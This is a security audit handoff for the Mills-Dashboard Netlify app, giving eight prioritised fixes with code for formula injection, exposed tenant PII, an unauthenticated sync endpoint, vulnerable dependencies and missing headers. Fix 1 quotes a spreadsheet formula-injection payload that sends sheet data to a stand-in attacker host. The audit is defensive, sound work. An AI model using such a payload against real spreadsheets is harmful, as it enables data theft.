# Mills-Dashboard Security Audit Handoff

**Audit date:** 2026-05-13  
**Branch to work on:** `claude/research-concerns-xJlXd`  
**Production URL:** https://mills-dashboard.netlify.app  

---

## Background

A full codebase security audit was completed on 2026-05-13, prompted by the confirmed
"Mini Shai-Hulud" npm supply-chain attack (May 11–12, 2026) that planted persistence
hooks in `.claude/settings.json` and `.vscode/tasks.json`. The repo was confirmed clean
of that attack. The audit then covered all 18 Netlify functions, frontend code,
dependencies, git hygiene, and automation hooks.

All fixes listed below have been analyzed for UX and app impact. None of them break
existing functionality. They are ordered by priority.

---

## Fix 1 — Formula injection in Google Sheets writes (HIGH)

**File:** `netlify/functions/update-property-info.js`  
**Lines:** 95, 103, 113

**Problem:** All three `spreadsheets.values` write calls use `valueInputOption: 'USER_ENTERED'`.
Google Sheets interprets values starting with `=`, `+`, `-`, or `@` as formulas. A caller
could inject `=IMPORTDATA("https://attacker.example/?d="&A1:ZZ99)` to exfiltrate the
entire sheet. This is a one-word fix.

**UX impact:** None. All fields written by this app are plain text (door codes, paint
colors, appliance notes, dates as strings). `RAW` stores them identically. The history
tab timestamp (`new Date().toISOString()`) will show as a text string in Sheets instead
of an auto-parsed date — still fully readable.

**Change:**

```js
// Line 95 — append new row
valueInputOption: 'RAW',

// Line 103 — update specific cell
valueInputOption: 'RAW',

// Line 113 — history tab append
valueInputOption: 'RAW',
```

Replace all three occurrences of `'USER_ENTERED'` with `'RAW'`.

---

## Fix 2 — Real tenant PII in committed seed file (MEDIUM)

**File:** `src/data/units-seed.json`  
**Problem:** 2,656 lines of real tenant data — names, email addresses, phone numbers —
committed to git history and bundled into the public `dist/` build by Vite. Anyone
who visits the production site can read this file in the JS bundle.

**UX impact:** The seed file is the offline fallback shown when the live API fails
("Local data" orange dot). After this fix, offline/failure state shows placeholder
names instead of real ones. That is the correct behavior.

**Steps:**

1. Replace the contents of `src/data/units-seed.json` with a small array of 2–3
   clearly fake placeholder units, e.g.:

```json
[
  {
    "id": 1,
    "address": "123 Example St",
    "beds": "3",
    "area": "Sample Area",
    "owner_name": "Owner Name",
    "residents": [{ "name": "Resident Name", "email": "resident@example.com", "phone": "(555) 000-0000", "status": "Current" }],
    "next_residents": []
  }
]
```

2. **Git history:** The real data is already in git history and cannot be removed without
   a force-push rewrite. For a private repo with a small internal team this is acceptable
   risk. If the repo ever becomes public, use `git filter-repo` or BFG Repo Cleaner to
   scrub the file from history, then force-push and rotate any credentials that were
   ever in the repo.

---

## Fix 3 — Add auth to `trigger-sync` endpoint (HIGH)

**File:** `netlify/functions/trigger-sync.js`  
**Problem:** Any unauthenticated POST to `/api/trigger-sync` dispatches your GitHub
Actions workflow. The workflow runs with `GH_DISPATCH_TOKEN` (actions:write scope).
Repeated calls waste Actions minutes and could be used to hammer the sync pipeline.

**Pattern to follow:** mirrors `recording-status.js` which already does secret-header auth.

**Step 1 — Add env var to Netlify:**
In the Netlify dashboard → Site configuration → Environment variables, add:
```
SYNC_SECRET=<random 32-char hex string>   # openssl rand -hex 16
```

**Step 2 — Update `trigger-sync.js`:**

Add this block immediately after the `httpMethod !== 'POST'` check (around line 10):

```js
const provided = event.headers['x-sync-secret'] || '';
const expected = process.env.SYNC_SECRET || '';
if (!expected || provided !== expected) {
  return { statusCode: 401, body: JSON.stringify({ error: 'Unauthorized' }) };
}
```

**Step 3 — Update the frontend call site:**

Find where `/api/trigger-sync` is called in `src/` (likely `App.jsx` or a header
component) and add the header:

```js
headers: {
  'Content-Type': 'application/json',
  'x-sync-secret': import.meta.env.VITE_SYNC_SECRET,
},
```

Add to `.env` (local dev):
```
VITE_SYNC_SECRET=<same value as SYNC_SECRET>
```

Add to Netlify environment variables:
```
VITE_SYNC_SECRET=<same value>
```

> Note: `VITE_` prefix exposes the value to the browser bundle. This is intentional —
> it's a shared team secret for an internal tool, not a privileged credential. The
> real protection is that the secret is not guessable; it doesn't matter that it's in
> the JS bundle since the same people who have the URL also have the app.

---

## Fix 4 — `nodemailer` CVEs (HIGH)

**File:** `package.json`  
**Current version:** `^6.10.1`  
**Problem:** 4 CVEs including CVSS 7.5 DoS via recursive address parsing (GHSA-rcmh-qjqh-p98v).

**Fix:**
```bash
npm install nodemailer@^8.0.7
```

**Breaking change check:** nodemailer v7→v8 dropped the legacy `createTransport` direct
callback form. The codebase uses `transporter.sendMail(...)` with async/await — this API
is unchanged. Run the sync script with `--dry-run` after upgrading to confirm no errors.

Files that use nodemailer: `scripts/sync-from-neo.mjs` (change summary email),
`scripts/meeting-capture/process-meeting.mjs` (meeting summary email).

---

## Fix 5 — Timing-safe secret comparison in `recording-status` (MEDIUM)

**File:** `netlify/functions/recording-status.js`  
**Line:** 46 (approximately)

**Problem:** `if (provided !== expected)` uses JavaScript's `!==` which is not
timing-safe. A timing oracle can leak the secret one character at a time.

**Fix:**

```js
// At top of file, add:
import { timingSafeEqual } from 'crypto';

// Replace the comparison:
// Before:
if (provided !== expected) {

// After:
const providedBuf = Buffer.from(provided || '');
const expectedBuf = Buffer.from(expected || '');
if (providedBuf.length !== expectedBuf.length || !timingSafeEqual(providedBuf, expectedBuf)) {
```

The length check is required because `timingSafeEqual` throws if buffers differ in length.

---

## Fix 6 — Security headers in `netlify.toml` (LOW)

**File:** `netlify.toml`  
**Problem:** No security headers. The app can be iframed, HTTPS is not enforced by
header, content-type sniffing is not prevented.

**Add this block to `netlify.toml`:**

```toml
[[headers]]
  for = "/*"
  [headers.values]
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Strict-Transport-Security = "max-age=63072000; includeSubDomains; preload"
    Permissions-Policy = "camera=(), microphone=(), geolocation=()"
```

No testing required beyond a deploy — these are purely additive response headers.

---

## Fix 7 — Input validation on `save-inspection` (MEDIUM)

**File:** `netlify/functions/save-inspection.js`  
**Lines:** ~61, ~64

**Problem:** `inspection.status` and `overall_condition` are written to the DB without
validation. Any string passes through.

**Add near the top of the handler:**

```js
const VALID_STATUSES = new Set(['draft', 'complete']);
const VALID_CONDITIONS = new Set(['up_to_date', 'needs_love', 'at_risk', '']);

const status = inspection.status || 'complete';
const overallCondition = inspection.overall_condition || '';

if (!VALID_STATUSES.has(status)) {
  return { statusCode: 400, body: JSON.stringify({ error: `Invalid status: ${status}` }) };
}
if (!VALID_CONDITIONS.has(overallCondition)) {
  return { statusCode: 400, body: JSON.stringify({ error: `Invalid condition: ${overallCondition}` }) };
}
```

---

## Fix 8 — Date validation on `save-calendar-task` (MEDIUM)

**File:** `netlify/functions/save-calendar-task.js`  
**Lines:** ~49–51

**Problem:** `start_date` and `end_date` are stored without format validation.

**Add after parsing the request body:**

```js
const ISO_DATE = /^\d{4}-\d{2}-\d{2}$/;
if (start_date && !ISO_DATE.test(start_date)) {
  return { statusCode: 400, body: JSON.stringify({ error: 'Invalid start_date format' }) };
}
if (end_date && !ISO_DATE.test(end_date)) {
  return { statusCode: 400, body: JSON.stringify({ error: 'Invalid end_date format' }) };
}
```

---

## What was NOT done / out of scope

**H1 — No auth on all 18 endpoints:** This is an architectural decision, not a bug.
The team is aware; fixing it properly requires either Netlify Identity, a Cloudflare
Access rule, or a shared bearer token added to every endpoint and the dashboard fetch
wrapper. Fix 3 above (`trigger-sync`) is the highest-priority individual case because
it has side effects beyond reads. The read endpoints (`get-units`, `get-property-info`,
etc.) expose PII but the team accepts that risk for an internal tool.

**M4 / M5 — PII in `localStorage` cache:** The full units dataset (including access
codes and tenant PII) is cached in `localStorage` under `mills_units_cache`. This is
intentional for offline UX. The fix is either: (a) strip `door_code`/`lockbox_code`/
`alarm_code` from the `get-units` response and serve them only from the per-property
`get-property-info` endpoint, or (b) set a short `maxAge` on the cache and clear it
on page unload. Not implemented — needs product decision on acceptable offline behavior.

**M6, L6, L7 — Dev-only CVEs (vite, picomatch, postcss):** None affect the production
build. Run `npm audit fix` to resolve; all are transitive dependencies so the fix is
safe.

---

## npm audit summary

Run `npm audit` to see current state. As of audit date, high/critical findings:
- `nodemailer` — 4 CVEs, fix with `npm install nodemailer@^8.0.7` (Fix 4 above)
- `vite` — 2 CVEs (dev only), fix with `npm install vite@latest`
- `picomatch` — ReDoS (dev only, transitive)
- `postcss` — XSS in CSS stringify (dev only, transitive)

Run `npm audit fix` after applying Fix 4 to resolve most remaining items.

---

## Testing checklist after implementing

- [ ] Edit a property field in the dashboard → confirm it saves and reads back correctly
- [ ] Check the Google Sheet history tab → confirm new row appears with ISO timestamp
- [ ] Click the Sync button → confirm it triggers (or returns 401 if secret missing)
- [ ] Save an inspection → confirm it saves with status `complete`
- [ ] Create a calendar task → confirm it saves and appears on the calendar
- [ ] Toggle recording status via `record-meeting.sh` → confirm REC pill appears/disappears
- [ ] Run `npm audit` → confirm nodemailer CVEs resolved

---

## Files touched by these fixes

```
netlify/functions/update-property-info.js   Fix 1
netlify/functions/trigger-sync.js           Fix 3
netlify/functions/recording-status.js       Fix 5
netlify/functions/save-inspection.js        Fix 7
netlify/functions/save-calendar-task.js     Fix 8
src/data/units-seed.json                    Fix 2
src/App.jsx (or header component)           Fix 3 (frontend call site)
netlify.toml                                Fix 6
package.json / package-lock.json            Fix 4
.env (local) + Netlify env vars             Fix 3, Fix 4
```
